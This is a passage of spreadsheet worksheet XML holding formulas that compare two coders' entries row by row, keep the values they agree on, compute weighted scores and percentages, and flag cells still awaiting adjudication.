        <f>IF(AND(Coder1!AF118&amp;""&lt;&gt;"",Coder1!AF118&amp;""=Coder2!AF118&amp;""),Coder1!AF118,"")</f>
        <v/>
      </c>
      <c r="AG118" s="14">
        <f>IF(AND(Coder1!AG118&amp;""&lt;&gt;"",Coder1!AG118&amp;""=Coder2!AG118&amp;""),Coder1!AG118,"")</f>
        <v/>
      </c>
      <c r="AH118" s="14">
        <f>IF(AND(Coder1!AH118&amp;""&lt;&gt;"",Coder1!AH118&amp;""=Coder2!AH118&amp;""),Coder1!AH118,"")</f>
        <v/>
      </c>
      <c r="AI118" s="11">
        <f>IF(COUNT(E118:L118)=0,"",SUM(E118:L118))</f>
        <v/>
      </c>
      <c r="AJ118" s="11">
        <f>IF(AI118="","",N(E118)*3+N(F118)*2+N(G118)*2+N(H118)*2+N(I118)*2+N(J118)*3+N(K118)*3+N(L118)*3)</f>
        <v/>
      </c>
      <c r="AK118" s="11">
        <f>IF(AI118="","",COUNTIF(N118:AG118,1))</f>
        <v/>
      </c>
      <c r="AL118" s="11">
        <f>IF(OR(AJ118="",AJ118=0),"",ROUND(100*(AJ118-AK118)/AJ118,1))</f>
        <v/>
      </c>
      <c r="AM118" s="11">
        <f>IF(AND(Coder1!AN118=1,Coder2!AN118=1),IF(COUNTBLANK(E118:AH118)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN118" s="11">
        <f>IF(AND(Coder1!AN118=1,Coder2!AN118=1),IF(SUMPRODUCT(--(Coder1!E118:AH118&amp;""&lt;&gt;Coder2!E118:AH118&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO118" s="11" t="n"/>
    </row>
    <row r="119">
      <c r="A119" s="11">
        <f>Coder1!A119</f>
        <v/>
      </c>
      <c r="B119" s="11">
        <f>Coder1!B119</f>
        <v/>
      </c>
      <c r="C119" s="11">
        <f>Coder1!C119</f>
        <v/>
      </c>
      <c r="D119" s="11">
        <f>Coder1!D119</f>
        <v/>
      </c>
      <c r="E119" s="14">
        <f>IF(AND(Coder1!E119&amp;""&lt;&gt;"",Coder1!E119&amp;""=Coder2!E119&amp;""),Coder1!E119,"")</f>
        <v/>
      </c>
      <c r="F119" s="14">
        <f>IF(AND(Coder1!F119&amp;""&lt;&gt;"",Coder1!F119&amp;""=Coder2!F119&amp;""),Coder1!F119,"")</f>
        <v/>
      </c>
      <c r="G119" s="14">
        <f>IF(AND(Coder1!G119&amp;""&lt;&gt;"",Coder1!G119&amp;""=Coder2!G119&amp;""),Coder1!G119,"")</f>
        <v/>
      </c>
      <c r="H119" s="14">
        <f>IF(AND(Coder1!H119&amp;""&lt;&gt;"",Coder1!H119&amp;""=Coder2!H119&amp;""),Coder1!H119,"")</f>
        <v/>
      </c>
      <c r="I119" s="14">
        <f>IF(AND(Coder1!I119&amp;""&lt;&gt;"",Coder1!I119&amp;""=Coder2!I119&amp;""),Coder1!I119,"")</f>
        <v/>
      </c>
      <c r="J119" s="14">
        <f>IF(AND(Coder1!J119&amp;""&lt;&gt;"",Coder1!J119&amp;""=Coder2!J119&amp;""),Coder1!J119,"")</f>
        <v/>
      </c>
      <c r="K119" s="14">
        <f>IF(AND(Coder1!K119&amp;""&lt;&gt;"",Coder1!K119&amp;""=Coder2!K119&amp;""),Coder1!K119,"")</f>
        <v/>
      </c>
      <c r="L119" s="14">
        <f>IF(AND(Coder1!L119&amp;""&lt;&gt;"",Coder1!L119&amp;""=Coder2!L119&amp;""),Coder1!L119,"")</f>
        <v/>
      </c>
      <c r="M119" s="14">
        <f>IF(AND(Coder1!M119&amp;""&lt;&gt;"",Coder1!M119&amp;""=Coder2!M119&amp;""),Coder1!M119,"")</f>
        <v/>
      </c>
      <c r="N119" s="14">
        <f>IF(AND(Coder1!N119&amp;""&lt;&gt;"",Coder1!N119&amp;""=Coder2!N119&amp;""),Coder1!N119,"")</f>
        <v/>
      </c>
      <c r="O119" s="14">
        <f>IF(AND(Coder1!O119&amp;""&lt;&gt;"",Coder1!O119&amp;""=Coder2!O119&amp;""),Coder1!O119,"")</f>
        <v/>
      </c>
      <c r="P119" s="14">
        <f>IF(AND(Coder1!P119&amp;""&lt;&gt;"",Coder1!P119&amp;""=Coder2!P119&amp;""),Coder1!P119,"")</f>
        <v/>
      </c>
      <c r="Q119" s="14">
        <f>IF(AND(Coder1!Q119&amp;""&lt;&gt;"",Coder1!Q119&amp;""=Coder2!Q119&amp;""),Coder1!Q119,"")</f>
        <v/>
      </c>
      <c r="R119" s="14">
        <f>IF(AND(Coder1!R119&amp;""&lt;&gt;"",Coder1!R119&amp;""=Coder2!R119&amp;""),Coder1!R119,"")</f>
        <v/>
      </c>
      <c r="S119" s="14">
        <f>IF(AND(Coder1!S119&amp;""&lt;&gt;"",Coder1!S119&amp;""=Coder2!S119&amp;""),Coder1!S119,"")</f>
        <v/>
      </c>
      <c r="T119" s="14">
        <f>IF(AND(Coder1!T119&amp;""&lt;&gt;"",Coder1!T119&amp;""=Coder2!T119&amp;""),Coder1!T119,"")</f>
        <v/>
      </c>
      <c r="U119" s="14">
        <f>IF(AND(Coder1!U119&amp;""&lt;&gt;"",Coder1!U119&amp;""=Coder2!U119&amp;""),Coder1!U119,"")</f>
        <v/>
      </c>
      <c r="V119" s="14">
        <f>IF(AND(Coder1!V119&amp;""&lt;&gt;"",Coder1!V119&amp;""=Coder2!V119&amp;""),Coder1!V119,"")</f>
        <v/>
      </c>
      <c r="W119" s="14">
        <f>IF(AND(Coder1!W119&amp;""&lt;&gt;"",Coder1!W119&amp;""=Coder2!W119&amp;""),Coder1!W119,"")</f>
        <v/>
      </c>
      <c r="X119" s="14">
        <f>IF(AND(Coder1!X119&amp;""&lt;&gt;"",Coder1!X119&amp;""=Coder2!X119&amp;""),Coder1!X119,"")</f>
        <v/>
      </c>
      <c r="Y119" s="14">
        <f>IF(AND(Coder1!Y119&amp;""&lt;&gt;"",Coder1!Y119&amp;""=Coder2!Y119&amp;""),Coder1!Y119,"")</f>
        <v/>
      </c>
      <c r="Z119" s="14">
        <f>IF(AND(Coder1!Z119&amp;""&lt;&gt;"",Coder1!Z119&amp;""=Coder2!Z119&amp;""),Coder1!Z119,"")</f>
        <v/>
      </c>
      <c r="AA119" s="14">
        <f>IF(AND(Coder1!AA119&amp;""&lt;&gt;"",Coder1!AA119&amp;""=Coder2!AA119&amp;""),Coder1!AA119,"")</f>
        <v/>
      </c>
      <c r="AB119" s="14">
        <f>IF(AND(Coder1!AB119&amp;""&lt;&gt;"",Coder1!AB119&amp;""=Coder2!AB119&amp;""),Coder1!AB119,"")</f>
        <v/>
      </c>
      <c r="AC119" s="14">
        <f>IF(AND(Coder1!AC119&amp;""&lt;&gt;"",Coder1!AC119&amp;""=Coder2!AC119&amp;""),Coder1!AC119,"")</f>
        <v/>
      </c>
      <c r="AD119" s="14">
        <f>IF(AND(Coder1!AD119&amp;""&lt;&gt;"",Coder1!AD119&amp;""=Coder2!AD119&amp;""),Coder1!AD119,"")</f>
        <v/>
      </c>
      <c r="AE119" s="14">
        <f>IF(AND(Coder1!AE119&amp;""&lt;&gt;"",Coder1!AE119&amp;""=Coder2!AE119&amp;""),Coder1!AE119,"")</f>
        <v/>
      </c>
      <c r="AF119" s="14">
        <f>IF(AND(Coder1!AF119&amp;""&lt;&gt;"",Coder1!AF119&amp;""=Coder2!AF119&amp;""),Coder1!AF119,"")</f>
        <v/>
      </c>
      <c r="AG119" s="14">
        <f>IF(AND(Coder1!AG119&amp;""&lt;&gt;"",Coder1!AG119&amp;""=Coder2!AG119&amp;""),Coder1!AG119,"")</f>
        <v/>
      </c>
      <c r="AH119" s="14">
        <f>IF(AND(Coder1!AH119&amp;""&lt;&gt;"",Coder1!AH119&amp;""=Coder2!AH119&amp;""),Coder1!AH119,"")</f>
        <v/>
      </c>
      <c r="AI119" s="11">
        <f>IF(COUNT(E119:L119)=0,"",SUM(E119:L119))</f>
        <v/>
      </c>
      <c r="AJ119" s="11">
        <f>IF(AI119="","",N(E119)*3+N(F119)*2+N(G119)*2+N(H119)*2+N(I119)*2+N(J119)*3+N(K119)*3+N(L119)*3)</f>
        <v/>
      </c>
      <c r="AK119" s="11">
        <f>IF(AI119="","",COUNTIF(N119:AG119,1))</f>
        <v/>
      </c>
      <c r="AL119" s="11">
        <f>IF(OR(AJ119="",AJ119=0),"",ROUND(100*(AJ119-AK119)/AJ119,1))</f>
        <v/>
      </c>
      <c r="AM119" s="11">
        <f>IF(AND(Coder1!AN119=1,Coder2!AN119=1),IF(COUNTBLANK(E119:AH119)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN119" s="11">
        <f>IF(AND(Coder1!AN119=1,Coder2!AN119=1),IF(SUMPRODUCT(--(Coder1!E119:AH119&amp;""&lt;&gt;Coder2!E119:AH119&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO119" s="11" t="n"/>
    </row>
    <row r="120">
      <c r="A120" s="11">
        <f>Coder1!A120</f>
        <v/>
      </c>
      <c r="B120" s="11">
        <f>Coder1!B120</f>
        <v/>
      </c>
      <c r="C120" s="11">
        <f>Coder1!C120</f>
        <v/>
      </c>
      <c r="D120" s="11">
        <f>Coder1!D120</f>
        <v/>
      </c>
      <c r="E120" s="14">
        <f>IF(AND(Coder1!E120&amp;""&lt;&gt;"",Coder1!E120&amp;""=Coder2!E120&amp;""),Coder1!E120,"")</f>
        <v/>
      </c>
      <c r="F120" s="14">
        <f>IF(AND(Coder1!F120&amp;""&lt;&gt;"",Coder1!F120&amp;""=Coder2!F120&amp;""),Coder1!F120,"")</f>
        <v/>
      </c>
      <c r="G120" s="14">
        <f>IF(AND(Coder1!G120&amp;""&lt;&gt;"",Coder1!G120&amp;""=Coder2!G120&amp;""),Coder1!G120,"")</f>
        <v/>
      </c>
      <c r="H120" s="14">
        <f>IF(AND(Coder1!H120&amp;""&lt;&gt;"",Coder1!H120&amp;""=Coder2!H120&amp;""),Coder1!H120,"")</f>
        <v/>
      </c>
      <c r="I120" s="14">
        <f>IF(AND(Coder1!I120&amp;""&lt;&gt;"",Coder1!I120&amp;""=Coder2!I120&amp;""),Coder1!I120,"")</f>
        <v/>
      </c>
      <c r="J120" s="14">
        <f>IF(AND(Coder1!J120&amp;""&lt;&gt;"",Coder1!J120&amp;""=Coder2!J120&amp;""),Coder1!J120,"")</f>
        <v/>
      </c>
      <c r="K120" s="14">
        <f>IF(AND(Coder1!K120&amp;""&lt;&gt;"",Coder1!K120&amp;""=Coder2!K120&amp;""),Coder1!K120,"")</f>
        <v/>
      </c>
      <c r="L120" s="14">
        <f>IF(AND(Coder1!L120&amp;""&lt;&gt;"",Coder1!L120&amp;""=Coder2!L120&amp;""),Coder1!L120,"")</f>
        <v/>
      </c>
      <c r="M120" s="14">
        <f>IF(AND(Coder1!M120&amp;""&lt;&gt;"",Coder1!M120&amp;""=Coder2!M120&amp;""),Coder1!M120,"")</f>
        <v/>
      </c>
      <c r="N120" s="14">
        <f>IF(AND(Coder1!N120&amp;""&lt;&gt;"",Coder1!N120&amp;""=Coder2!N120&amp;""),Coder1!N120,"")</f>
        <v/>
      </c>
      <c r="O120" s="14">
        <f>IF(AND(Coder1!O120&amp;""&lt;&gt;"",Coder1!O120&amp;""=Coder2!O120&amp;""),Coder1!O120,"")</f>
        <v/>
      </c>
      <c r="P120" s="14">
        <f>IF(AND(Coder1!P120&amp;""&lt;&gt;"",Coder1!P120&amp;""=Coder2!P120&amp;""),Coder1!P120,"")</f>
        <v/>
      </c>
      <c r="Q120" s="14">
        <f>IF(AND(Coder1!Q120&amp;""&lt;&gt;"",Coder1!Q120&amp;""=Coder2!Q120&amp;""),Coder1!Q120,"")</f>
        <v/>
      </c>
      <c r="R120" s="14">
        <f>IF(AND(Coder1!R120&amp;""&lt;&gt;"",Coder1!R120&amp;""=Coder2!R120&amp;""),Coder1!R120,"")</f>
        <v/>
      </c>
      <c r="S120" s="14">
        <f>IF(AND(Coder1!S120&amp;""&lt;&gt;"",Coder1!S120&amp;""=Coder2!S120&amp;""),Coder1!S120,"")</f>
        <v/>
      </c>
      <c r="T120" s="14">
        <f>IF(AND(Coder1!T120&amp;""&lt;&gt;"",Coder1!T120&amp;""=Coder2!T120&amp;""),Coder1!T120,"")</f>
        <v/>
      </c>
      <c r="U120" s="14">
        <f>IF(AND(Coder1!U120&amp;""&lt;&gt;"",Coder1!U120&amp;""=Coder2!U120&amp;""),Coder1!U120,"")</f>
        <v/>
      </c>
      <c r="V120" s="14">
        <f>IF(AND(Coder1!V120&amp;""&lt;&gt;"",Coder1!V120&amp;""=Coder2!V120&amp;""),Coder1!V120,"")</f>
        <v/>
      </c>
      <c r="W120" s="14">
        <f>IF(AND(Coder1!W120&amp;""&lt;&gt;"",Coder1!W120&amp;""=Coder2!W120&amp;""),Coder1!W120,"")</f>
        <v/>
      </c>
      <c r="X120" s="14">
        <f>IF(AND(Coder1!X120&amp;""&lt;&gt;"",Coder1!X120&amp;""=Coder2!X120&amp;""),Coder1!X120,"")</f>
        <v/>
      </c>
      <c r="Y120" s="14">
        <f>IF(AND(Coder1!Y120&amp;""&lt;&gt;"",Coder1!Y120&amp;""=Coder2!Y120&amp;""),Coder1!Y120,"")</f>
        <v/>
      </c>
      <c r="Z120" s="14">
        <f>IF(AND(Coder1!Z120&amp;""&lt;&gt;"",Coder1!Z120&amp;""=Coder2!Z120&amp;""),Coder1!Z120,"")</f>
        <v/>
      </c>
      <c r="AA120" s="14">
        <f>IF(AND(Coder1!AA120&amp;""&lt;&gt;"",Coder1!AA120&amp;""=Coder2!AA120&amp;""),Coder1!AA120,"")</f>
        <v/>
      </c>
      <c r="AB120" s="14">
        <f>IF(AND(Coder1!AB120&amp;""&lt;&gt;"",Coder1!AB120&amp;""=Coder2!AB120&amp;""),Coder1!AB120,"")</f>
        <v/>
      </c>
      <c r="AC120" s="14">
        <f>IF(AND(Coder1!AC120&amp;""&lt;&gt;"",Coder1!AC120&amp;""=Coder2!AC120&amp;""),Coder1!AC120,"")</f>
        <v/>
      </c>
      <c r="AD120" s="14">
        <f>IF(AND(Coder1!AD120&amp;""&lt;&gt;"",Coder1!AD120&amp;""=Coder2!AD120&amp;""),Coder1!AD120,"")</f>
        <v/>
      </c>
      <c r="AE120" s="14">
        <f>IF(AND(Coder1!AE120&amp;""&lt;&gt;"",Coder1!AE120&amp;""=Coder2!AE120&amp;""),Coder1!AE120,"")</f>
        <v/>
      </c>
      <c r="AF120" s="14">
        <f>IF(AND(Coder1!AF120&amp;""&lt;&gt;"",Coder1!AF120&amp;""=Coder2!AF120&amp;""),Coder1!AF120,"")</f>
        <v/>
      </c>
      <c r="AG120" s="14">
        <f>IF(AND(Coder1!AG120&amp;""&lt;&gt;"",Coder1!AG120&amp;""=Coder2!AG120&amp;""),Coder1!AG120,"")</f>
        <v/>
      </c>
      <c r="AH120" s="14">
        <f>IF(AND(Coder1!AH120&amp;""&lt;&gt;"",Coder1!AH120&amp;""=Coder2!AH120&amp;""),Coder1!AH120,"")</f>
        <v/>
      </c>
      <c r="AI120" s="11">
        <f>IF(COUNT(E120:L120)=0,"",SUM(E120:L120))</f>
        <v/>
      </c>
      <c r="AJ120" s="11">
        <f>IF(AI120="","",N(E120)*3+N(F120)*2+N(G120)*2+N(H120)*2+N(I120)*2+N(J120)*3+N(K120)*3+N(L120)*3)</f>
        <v/>
      </c>
      <c r="AK120" s="11">
        <f>IF(AI120="","",COUNTIF(N120:AG120,1))</f>
        <v/>
      </c>
      <c r="AL120" s="11">
        <f>IF(OR(AJ120="",AJ120=0),"",ROUND(100*(AJ120-AK120)/AJ120,1))</f>
        <v/>
      </c>
      <c r="AM120" s="11">
        <f>IF(AND(Coder1!AN120=1,Coder2!AN120=1),IF(COUNTBLANK(E120:AH120)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN120" s="11">
        <f>IF(AND(Coder1!AN120=1,Coder2!AN120=1),IF(SUMPRODUCT(--(Coder1!E120:AH120&amp;""&lt;&gt;Coder2!E120:AH120&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO120" s="11" t="n"/>
    </row>
    <row r="121">
      <c r="A121" s="11">
        <f>Coder1!A121</f>
        <v/>
      </c>
      <c r="B121" s="11">
        <f>Coder1!B121</f>
        <v/>
      </c>
      <c r="C121" s="11">
        <f>Coder1!C121</f>
        <v/>
      </c>
      <c r="D121" s="11">
        <f>Coder1!D121</f>
        <v/>
      </c>
      <c r="E121" s="14">
        <f>IF(AND(Coder1!E121&amp;""&lt;&gt;"",Coder1!E121&amp;""=Coder2!E121&amp;""),Coder1!E121,"")</f>
        <v/>
      </c>
      <c r="F121" s="14">
        <f>IF(AND(Coder1!F121&amp;""&lt;&gt;"",Coder1!F121&amp;""=Coder2!F121&amp;""),Coder1!F121,"")</f>
        <v/>
      </c>
      <c r="G121" s="14">
        <f>IF(AND(Coder1!G121&amp;""&lt;&gt;"",Coder1!G121&amp;""=Coder2!G121&amp;""),Coder1!G121,"")</f>
        <v/>
      </c>
      <c r="H121" s="14">
        <f>IF(AND(Coder1!H121&amp;""&lt;&gt;"",Coder1!H121&amp;""=Coder2!H121&amp;""),Coder1!H121,"")</f>
        <v/>
      </c>
      <c r="I121" s="14">
        <f>IF(AND(Coder1!I121&amp;""&lt;&gt;"",Coder1!I121&amp;""=Coder2!I121&amp;""),Coder1!I121,"")</f>
        <v/>
      </c>
      <c r="J121" s="14">
        <f>IF(AND(Coder1!J121&amp;""&lt;&gt;"",Coder1!J121&amp;""=Coder2!J121&amp;""),Coder1!J121,"")</f>
        <v/>
      </c>
      <c r="K121" s="14">
        <f>IF(AND(Coder1!K121&amp;""&lt;&gt;"",Coder1!K121&amp;""=Coder2!K121&amp;""),Coder1!K121,"")</f>
        <v/>
      </c>
      <c r="L121" s="14">
        <f>IF(AND(Coder1!L121&amp;""&lt;&gt;"",Coder1!L121&amp;""=Coder2!L121&amp;""),Coder1!L121,"")</f>
        <v/>
      </c>
      <c r="M121" s="14">
        <f>IF(AND(Coder1!M121&amp;""&lt;&gt;"",Coder1!M121&amp;""=Coder2!M121&amp;""),Coder1!M121,"")</f>
        <v/>
      </c>
      <c r="N121" s="14">
        <f>IF(AND(Coder1!N121&amp;""&lt;&gt;"",Coder1!N121&amp;""=Coder2!N121&amp;""),Coder1!N121,"")</f>
        <v/>
      </c>
      <c r="O121" s="14">
        <f>IF(AND(Coder1!O121&amp;""&lt;&gt;"",Coder1!O121&amp;""=Coder2!O121&amp;""),Coder1!O121,"")</f>
        <v/>
      </c>
      <c r="P121" s="14">
        <f>IF(AND(Coder1!P121&amp;""&lt;&gt;"",Coder1!P121&amp;""=Coder2!P121&amp;""),Coder1!P121,"")</f>
        <v/>
      </c>
      <c r="Q121" s="14">
        <f>IF(AND(Coder1!Q121&amp;""&lt;&gt;"",Coder1!Q121&amp;""=Coder2!Q121&amp;""),Coder1!Q121,"")</f>
        <v/>
      </c>
      <c r="R121" s="14">
        <f>IF(AND(Coder1!R121&amp;""&lt;&gt;"",Coder1!R121&amp;""=Coder2!R121&amp;""),Coder1!R121,"")</f>
        <v/>
      </c>
      <c r="S121" s="14">
        <f>IF(AND(Coder1!S121&amp;""&lt;&gt;"",Coder1!S121&amp;""=Coder2!S121&amp;""),Coder1!S121,"")</f>
        <v/>
      </c>
      <c r="T121" s="14">
        <f>IF(AND(Coder1!T121&amp;""&lt;&gt;"",Coder1!T121&amp;""=Coder2!T121&amp;""),Coder1!T121,"")</f>
        <v/>
      </c>
      <c r="U121" s="14">
        <f>IF(AND(Coder1!U121&amp;""&lt;&gt;"",Coder1!U121&amp;""=Coder2!U121&amp;""),Coder1!U121,"")</f>
        <v/>
      </c>
      <c r="V121" s="14">
        <f>IF(AND(Coder1!V121&amp;""&lt;&gt;"",Coder1!V121&amp;""=Coder2!V121&amp;""),Coder1!V121,"")</f>
        <v/>
      </c>
      <c r="W121" s="14">
        <f>IF(AND(Coder1!W121&amp;""&lt;&gt;"",Coder1!W121&amp;""=Coder2!W121&amp;""),Coder1!W121,"")</f>
        <v/>
      </c>
      <c r="X121" s="14">
        <f>IF(AND(Coder1!X121&amp;""&lt;&gt;"",Coder1!X121&amp;""=Coder2!X121&amp;""),Coder1!X121,"")</f>
        <v/>
      </c>
      <c r="Y121" s="14">
        <f>IF(AND(Coder1!Y121&amp;""&lt;&gt;"",Coder1!Y121&amp;""=Coder2!Y121&amp;""),Coder1!Y121,"")</f>
        <v/>
      </c>
      <c r="Z121" s="14">
        <f>IF(AND(Coder1!Z121&amp;""&lt;&gt;"",Coder1!Z121&amp;""=Coder2!Z121&amp;""),Coder1!Z121,"")</f>
        <v/>
      </c>
      <c r="AA121" s="14">
        <f>IF(AND(Coder1!AA121&amp;""&lt;&gt;"",Coder1!AA121&amp;""=Coder2!AA121&amp;""),Coder1!AA121,"")</f>
        <v/>
      </c>
      <c r="AB121" s="14">
        <f>IF(AND(Coder1!AB121&amp;""&lt;&gt;"",Coder1!AB121&amp;""=Coder2!AB121&amp;""),Coder1!AB121,"")</f>
        <v/>
      </c>
      <c r="AC121" s="14">
        <f>IF(AND(Coder1!AC121&amp;""&lt;&gt;"",Coder1!AC121&amp;""=Coder2!AC121&amp;""),Coder1!AC121,"")</f>
        <v/>
      </c>
      <c r="AD121" s="14">
        <f>IF(AND(Coder1!AD121&amp;""&lt;&gt;"",Coder1!AD121&amp;""=Coder2!AD121&amp;""),Coder1!AD121,"")</f>
        <v/>
      </c>
      <c r="AE121" s="14">
        <f>IF(AND(Coder1!AE121&amp;""&lt;&gt;"",Coder1!AE121&amp;""=Coder2!AE121&amp;""),Coder1!AE121,"")</f>
        <v/>
      </c>
      <c r="AF121" s="14">
        <f>IF(AND(Coder1!AF121&amp;""&lt;&gt;"",Coder1!AF121&amp;""=Coder2!AF121&amp;""),Coder1!AF121,"")</f>
        <v/>
      </c>
      <c r="AG121" s="14">
        <f>IF(AND(Coder1!AG121&amp;""&lt;&gt;"",Coder1!AG121&amp;""=Coder2!AG121&amp;""),Coder1!AG121,"")</f>
        <v/>
      </c>
      <c r="AH121" s="14">
        <f>IF(AND(Coder1!AH121&amp;""&lt;&gt;"",Coder1!AH121&amp;""=Coder2!AH121&amp;""),Coder1!AH121,"")</f>
        <v/>
      </c>
      <c r="AI121" s="11">
        <f>IF(COUNT(E121:L121)=0,"",SUM(E121:L121))</f>
        <v/>
      </c>
      <c r="AJ121" s="11">
        <f>IF(AI121="","",N(E121)*3+N(F121)*2+N(G121)*2+N(H121)*2+N(I121)*2+N(J121)*3+N(K121)*3+N(L121)*3)</f>
        <v/>
      </c>
      <c r="AK121" s="11">
        <f>IF(AI121="","",COUNTIF(N121:AG121,1))</f>
        <v/>
      </c>
      <c r="AL121" s="11">
        <f>IF(OR(AJ121="",AJ121=0),"",ROUND(100*(AJ121-AK121)/AJ121,1))</f>
        <v/>
      </c>
      <c r="AM121" s="11">
        <f>IF(AND(Coder1!AN121=1,Coder2!AN121=1),IF(COUNTBLANK(E121:AH121)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN121" s="11">
        <f>IF(AND(Coder1!AN121=1,Coder2!AN121=1),IF(SUMPRODUCT(--(Coder1!E121:AH121&amp;""&lt;&gt;Coder2!E121:AH121&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO121" s="11" t="n"/>
    </row>
    <row r="122">
      <c r="A122" s="11">
        <f>Coder1!A122</f>
        <v/>
      </c>
      <c r="B122" s="11">
        <f>Coder1!B122</f>
        <v/>
      </c>
      <c r="C122" s="11">
        <f>Coder1!C122</f>
        <v/>
      </c>
      <c r="D122" s="11">
        <f>Coder1!D122</f>
        <v/>
      </c>
      <c r="E122" s="14">
        <f>IF(AND(Coder1!E122&amp;""&lt;&gt;"",Coder1!E122&amp;""=Coder2!E122&amp;""),Coder1!E122,"")</f>
        <v/>
      </c>
      <c r="F122" s="14">
        <f>IF(AND(Coder1!F122&amp;""&lt;&gt;"",Coder1!F122&amp;""=Coder2!F122&amp;""),Coder1!F122,"")</f>
        <v/>
      </c>
      <c r="G122" s="14">
        <f>IF(AND(Coder1!G122&amp;""&lt;&gt;"",Coder1!G122&amp;""=Coder2!G122&amp;""),Coder1!G122,"")</f>
        <v/>
      </c>
      <c r="H122" s="14">
        <f>IF(AND(Coder1!H122&amp;""&lt;&gt;"",Coder1!H122&amp;""=Coder2!H122&amp;""),Coder1!H122,"")</f>
        <v/>
      </c>
      <c r="I122" s="14">
        <f>IF(AND(Coder1!I122&amp;""&lt;&gt;"",Coder1!I122&amp;""=Coder2!I122&amp;""),Coder1!I122,"")</f>
        <v/>
      </c>
      <c r="J122" s="14">
        <f>IF(AND(Coder1!J122&amp;""&lt;&gt;"",Coder1!J122&amp;""=Coder2!J122&amp;""),Coder1!J122,"")</f>
        <v/>
      </c>
      <c r="K122" s="14">
        <f>IF(AND(Coder1!K122&amp;""&lt;&gt;"",Coder1!K122&amp;""=Coder2!K122&amp;""),Coder1!K122,"")</f>
        <v/>
      </c>
      <c r="L122" s="14">
        <f>IF(AND(Coder1!L122&amp;""&lt;&gt;"",Coder1!L122&amp;""=Coder2!L122&amp;""),Coder1!L122,"")</f>
        <v/>
      </c>
      <c r="M122" s="14">
        <f>IF(AND(Coder1!M122&amp;""&lt;&gt;"",Coder1!M122&amp;""=Coder2!M122&amp;""),Coder1!M122,"")</f>
        <v/>
      </c>
      <c r="N122" s="14">
        <f>IF(AND(Coder1!N122&amp;""&lt;&gt;"",Coder1!N122&amp;""=Coder2!N122&amp;""),Coder1!N122,"")</f>
        <v/>
      </c>
      <c r="O122" s="14">
        <f>IF(AND(Coder1!O122&amp;""&lt;&gt;"",Coder1!O122&amp;""=Coder2!O122&amp;""),Coder1!O122,"")</f>
        <v/>
      </c>
      <c r="P122" s="14">
        <f>IF(AND(Coder1!P122&amp;""&lt;&gt;"",Coder1!P122&amp;""=Coder2!P122&amp;""),Coder1!P122,"")</f>
        <v/>
      </c>
      <c r="Q122" s="14">
        <f>IF(AND(Coder1!Q122&amp;""&lt;&gt;"",Coder1!Q122&amp;""=Coder2!Q122&amp;""),Coder1!Q122,"")</f>
        <v/>
      </c>
      <c r="R122" s="14">
        <f>IF(AND(Coder1!R122&amp;""&lt;&gt;"",Coder1!R122&amp;""=Coder2!R122&amp;""),Coder1!R122,"")</f>
        <v/>
      </c>
      <c r="S122" s="14">
        <f>IF(AND(Coder1!S122&amp;""&lt;&gt;"",Coder1!S122&amp;""=Coder2!S122&amp;""),Coder1!S122,"")</f>
        <v/>
      </c>
      <c r="T122" s="14">
        <f>IF(AND(Coder1!T122&amp;""&lt;&gt;"",Coder1!T122&amp;""=Coder2!T122&amp;""),Coder1!T122,"")</f>
        <v/>
      </c>
      <c r="U122" s="14">
        <f>IF(AND(Coder1!U122&amp;""&lt;&gt;"",Coder1!U122&amp;""=Coder2!U122&amp;""),Coder1!U122,"")</f>
        <v/>
      </c>
      <c r="V122" s="14">
        <f>IF(AND(Coder1!V122&amp;""&lt;&gt;"",Coder1!V122&amp;""=Coder2!V122&amp;""),Coder1!V122,"")</f>
        <v/>
      </c>
      <c r="W122" s="14">
        <f>IF(AND(Coder1!W122&amp;""&lt;&gt;"",Coder1!W122&amp;""=Coder2!W122&amp;""),Coder1!W122,"")</f>
        <v/>
      </c>
      <c r="X122" s="14">
        <f>IF(AND(Coder1!X122&amp;""&lt;&gt;"",Coder1!X122&amp;""=Coder2!X122&amp;""),Coder1!X122,"")</f>
        <v/>
      </c>
      <c r="Y122" s="14">
        <f>IF(AND(Coder1!Y122&amp;""&lt;&gt;"",Coder1!Y122&amp;""=Coder2!Y122&amp;""),Coder1!Y122,"")</f>
        <v/>
      </c>
      <c r="Z122" s="14">
        <f>IF(AND(Coder1!Z122&amp;""&lt;&gt;"",Coder1!Z122&amp;""=Coder2!Z122&amp;""),Coder1!Z122,"")</f>
        <v/>
      </c>
      <c r="AA122" s="14">
        <f>IF(AND(Coder1!AA122&amp;""&lt;&gt;"",Coder1!AA122&amp;""=Coder2!AA122&amp;""),Coder1!AA122,"")</f>
        <v/>
      </c>
      <c r="AB122" s="14">
        <f>IF(AND(Coder1!AB122&amp;""&lt;&gt;"",Coder1!AB122&amp;""=Coder2!AB122&amp;""),Coder1!AB122,"")</f>
        <v/>
      </c>
      <c r="AC122" s="14">
        <f>IF(AND(Coder1!AC122&amp;""&lt;&gt;"",Coder1!AC122&amp;""=Coder2!AC122&amp;""),Coder1!AC122,"")</f>
        <v/>
      </c>
      <c r="AD122" s="14">
        <f>IF(AND(Coder1!AD122&amp;""&lt;&gt;"",Coder1!AD122&amp;""=Coder2!AD122&amp;""),Coder1!AD122,"")</f>
        <v/>
      </c>
      <c r="AE122" s="14">
        <f>IF(AND(Coder1!AE122&amp;""&lt;&gt;"",Coder1!AE122&amp;""=Coder2!AE122&amp;""),Coder1!AE122,"")</f>
        <v/>
      </c>
      <c r="AF122" s="14">
        <f>IF(AND(Coder1!AF122&amp;""&lt;&gt;"",Coder1!AF122&amp;""=Coder2!AF122&amp;""),Coder1!AF122,"")</f>
        <v/>
      </c>
      <c r="AG122" s="14">
        <f>IF(AND(Coder1!AG122&amp;""&lt;&gt;"",Coder1!AG122&amp;""=Coder2!AG122&amp;""),Coder1!AG122,"")</f>
        <v/>
      </c>
      <c r="AH122" s="14">
        <f>IF(AND(Coder1!AH122&amp;""&lt;&gt;"",Coder1!AH122&amp;""=Coder2!AH122&amp;""),Coder1!AH122,"")</f>
        <v/>
      </c>
      <c r="AI122" s="11">
